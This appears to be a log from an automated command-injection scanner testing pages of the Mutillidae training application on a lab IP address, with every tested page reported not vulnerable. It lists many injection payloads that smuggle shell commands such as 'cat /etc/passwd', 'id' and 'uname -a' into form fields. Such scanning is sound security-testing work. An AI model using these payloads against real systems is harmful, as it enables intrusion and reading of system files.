INFO - 
Starting ScanCommandInject scan
INFO - 	No forms found on http://192.168.232.129:80/. Skipping...
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=pen-test-tool-lookup.php
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/index.php?page=text-file-viewer.php
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=view-someones-blog.php
INFO - 	No forms found on http://192.168.232.129:80/mutillidae/?page=show-log.php. Skipping...
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ||mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: )mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: |touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: )touch abcdefghijkl.txt; ls on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ;ls / on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: \nls / on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &ls / on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: |ls / on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &&ls / on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ||ls / on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: )ls / on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ;id on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: \nid on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &id on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: |id on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &&id on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ||id on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: )id on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ;uname -a on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: \nuname -a on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &uname -a on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: |uname -a on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: &&uname -a on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ||uname -a on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: )uname -a on http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	No command injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing blind command injection
INFO - 	No blind command injection vulnerability found at: http://192.168.232.129:80/mutillidae/?page=text-file-viewer.php
INFO - 	Testing payload: ;cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: \ncat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: |cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &&cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: ||cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: )cat /etc/passwd on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: ;mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: \nmkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: |mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &&mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: ||mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: )mkdir abcdefghijkl && ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: ;touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: \ntouch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: |touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &&touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: ||touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: )touch abcdefghijkl.txt && ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: ;mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: \nmkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: |mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
INFO - 	Testing payload: &&mkdir abcdefghijkl; ls on http://192.168.232.129:80/mutillidae/?page=user-info.php
